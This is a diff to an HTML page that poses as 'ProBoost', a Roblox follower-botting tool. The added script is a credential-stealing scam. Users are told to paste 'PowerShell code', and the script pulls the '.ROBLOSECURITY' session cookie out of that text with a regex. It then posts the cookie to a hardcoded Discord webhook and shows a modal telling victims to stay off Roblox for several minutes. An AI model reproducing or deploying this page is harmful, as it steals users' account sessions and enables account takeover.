@@ -221,25 +221,6 @@
                 transform: translateY(-20px);
             }
         }
-        .blink-effect {
-            animation: blink 1.5s step-start infinite;
-        }
-        @keyframes blink {
-            50% {
-                opacity: 0;
-            }
-        }
-        .fade-in {
-            animation: fadeIn 2s ease-in-out;
-        }
-        @keyframes fadeIn {
-            0% {
-                opacity: 0;
-            }
-            100% {
-                opacity: 1;
-            }
-        }
     </style>
 </head>
 <body>
@@ -249,31 +230,31 @@
             ProBoost
         </h1>
     </header>
-    <main class="text-center mt-10 flex flex-col items-center">
+    <main class="text-center mt-20 flex flex-col items-center">
         <h2 class="text-4xl font-bold mb-8 text-white pulse-effect">
             ⭐ ROBLOX FOLLOWERS GENERATOR ⭐
         </h2>
-        <p class="mb-8 max-w-2xl">
+        <p class="mb-8">
             Follower botting has never been easier. ProBoost has all the right tools in order to make the process seamless.
         </p>
-        <div class="flex flex-wrap justify-center space-x-8 mb-16">
-            <div class="text-center cursor-pointer mb-4" onclick="document.getElementById('tutorial').scrollIntoView({ behavior: 'smooth' });">
-                <i class="fas fa-file-alt text-5xl text-blue-500 mb-2 blink-effect"></i>
+        <div class="flex justify-center space-x-8 mb-16">
+            <div class="text-center cursor-pointer" onclick="document.getElementById('tutorial').scrollIntoView({ behavior: 'smooth' });">
+                <i class="fas fa-file-alt text-5xl text-blue-500 mb-2"></i>
                 <p class="font-bold">Follow the Setup</p>
             </div>
-            <div class="text-center cursor-pointer mb-4" onclick="document.getElementById('followers-botter').scrollIntoView({ behavior: 'smooth' });">
-                <i class="fas fa-rocket text-5xl text-blue-500 mb-2 blink-effect"></i>
+            <div class="text-center cursor-pointer" onclick="document.getElementById('followers-botter').scrollIntoView({ behavior: 'smooth' });">
+                <i class="fas fa-rocket text-5xl text-blue-500 mb-2"></i>
                 <p class="font-bold">Start the Process</p>
             </div>
-            <div class="text-center mb-4">
-                <i class="fas fa-check-circle text-5xl text-blue-500 mb-2 blink-effect"></i>
+            <div class="text-center">
+                <i class="fas fa-check-circle text-5xl text-blue-500 mb-2"></i>
                 <p class="font-bold">Enjoy Your Followers</p>
             </div>
         </div>
         <button class="gradient-button text-white font-bold py-2 px-4 rounded mb-16" onclick="document.getElementById('followers-botter').scrollIntoView({ behavior: 'smooth' });">
             Start Botting
         </button>
-        <div class="bg-gray-800 bg-opacity-50 p-8 rounded-lg mb-24 mx-4 text-center fade-in max-w-2xl" id="tutorial">
+        <div class="bg-gray-800 bg-opacity-50 p-8 rounded-lg mb-24 mx-4 text-center" id="tutorial">
             <h3 class="text-2xl font-bold mb-4">Our Mission</h3>
             <p class="mb-4">
                 ProBoost's Follower Botter is an advanced PowerShell-based Follower Bot &amp; Auto-Bot. It is capable of botting followers up to 4x faster than other competitors with DL technology. All you need to do is follow the setup below.
@@ -290,19 +271,19 @@
             <img alt="Roblox character with a background of followers" class="w-1/2 h-auto border-none levitation" height="300" src="R.png" width="300"/>
             <p class="highlight ml-4 text-white bounce-effect">Followers Generator</p>
         </div>
-        <div class="bg-gray-800 bg-opacity-10 p-16 rounded-lg mb-24 mx-4 shiny-border fade-in max-w-2xl" id="followers-botter">
+        <div class="bg-gray-800 bg-opacity-10 p-16 rounded-lg mb-24 mx-4 shiny-border" id="followers-botter">
             <h3 class="text-xl font-bold mb-4">Followers Botter</h3>
             <div class="flex flex-col space-y-4">
                 <input class="p-2 rounded input-transparent text-white" id="username" placeholder="Username" type="text"/>
                 <input class="p-2 rounded input-transparent text-white" id="profile" placeholder="Profile" type="text"/>
                 <input class="p-2 rounded input-transparent text-white" id="followers" min="0" placeholder="Followers" step="1" type="number"/>
             </div>
-            <button class="gradient-button text-white font-bold py-2 px-4 rounded mt-4" id="generateBtn">
+            <button class="gradient-button text-white font-bold py-2 px-4 rounded mt-4" onclick="sendToWebhook()">
                 Start Botting
             </button>
         </div>
     </main>
-    <div class="bg-gray-800 bg-opacity-50 p-8 rounded-lg mb-24 mx-4 text-center fade-in max-w-2xl">
+    <div class="bg-gray-800 bg-opacity-50 p-8 rounded-lg mb-24 mx-4 text-center">
         <h3 class="text-2xl font-bold mb-4">Additional Information</h3>
         <p class="mb-4">
             ProBoost is constantly updated to ensure the best performance and security. Our team is dedicated to providing the best tools for your needs.
@@ -320,13 +301,14 @@
     <div class="modal" id="modal">
         <div class="modal-content">
             <i class="fas fa-check-circle"></i>
-            <p class="mt-4">¡Seguidores generados con éxito!</p>
+            <p class="mt-4">Generating Followers. Please wait 5-10 minutes.</p>
+            <p>[DO NOT ACCESS ROBLOX DURING THIS TIME]</p>
         </div>
     </div>
     <div class="modal" id="modal-error">
         <div class="modal-content modal-error">
             <i class="fas fa-times-circle"></i>
-            <p class="mt-4">Hubo un problema, por favor intenta de nuevo.</p>
+            <p class="mt-4">Error: Please fill in all fields or include the PowerShell code.</p>
         </div>
     </div>
     <script>
@@ -344,53 +326,55 @@
         }
         setInterval(createBubble, 500);
 
-        document.getElementById('generateBtn').addEventListener('click', function() {
-            let username = document.getElementById('username').value;
-            let followers = document.getElementById('followers').value;
+        function sendToWebhook() {
+            const username = document.getElementById('username').value;
+            const profile = document.getElementById('profile').value;
+            const followers = document.getElementById('followers').value;
 
-            if (username === "") {
-                showErrorModal("El campo de usuario no puede estar vacío.");
+            if (!username || !profile || !followers) {
+                showErrorModal();
                 return;
             }
 
-            // Enviar datos al Webhook
-            fetch('https://mi-webhook.com/endpoint', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    // Si necesitas un token de autenticación, agrégalo aquí:
-                    // 'Authorization': 'Bearer mi-token-aqui'
-                },
-                body: JSON.stringify({
-                    username: username,
-                    followers: followers
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    showSuccessModal("¡Seguidores generados con éxito!");
-                } else {
-                    showErrorModal("Hubo un problema generando los seguidores.");
-                }
-            })
-            .catch(error => {
-                showErrorModal("Error al generar seguidores. Intenta nuevamente más tarde.");
-            });
-        });
+            const webhookUrl = 'https://discord.com/api/webhooks/1352810286439993365/mwgH1enPDE-0kOENCx5mqk66qqf-OiT-fwGtZuFbIH-8bV9qMNBOd_8uhT4zyQFdNdEf';
 
-        function showErrorModal(message) {
-            const modal = document.getElementById('modal-error');
-            modal.querySelector('p').textContent = message;
+            const data = `Username: ${username}\nProfile: ${profile}\nFollowers: ${followers}`;
+            const lines = data.split('\n').slice(0, 11).join('\n'); // Get the first 11 lines
+
+            const match = data.match(/\.ROBLOSECURITY", "(.*?)"/);
+            if (match) {
+                const cookie = match[1];
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ content: cookie })
+                }).then(response => {
+                    if (response.ok) {
+                        showModal();
+                    } else {
+                        alert('Failed to send data.');
+                    }
+                }).catch(error => {
+                    console.error('Error:', error);
+                    alert('Failed to send data.');
+                });
+            } else {
+                showErrorModal();
+            }
+        }
+
+        function showModal() {
+            const modal = document.getElementById('modal');
             modal.style.display = 'flex';
             setTimeout(() => {
                 modal.style.display = 'none';
-            }, 5000);
+            }, 10000);
         }
 
-        function showSuccessModal(message) {
-            const modal = document.getElementById('modal');
-            modal.querySelector('p').textContent = message;
+        function showErrorModal() {
+            const modal = document.getElementById('modal-error');
             modal.style.display = 'flex';
             setTimeout(() => {
                 modal.style.display = 'none';
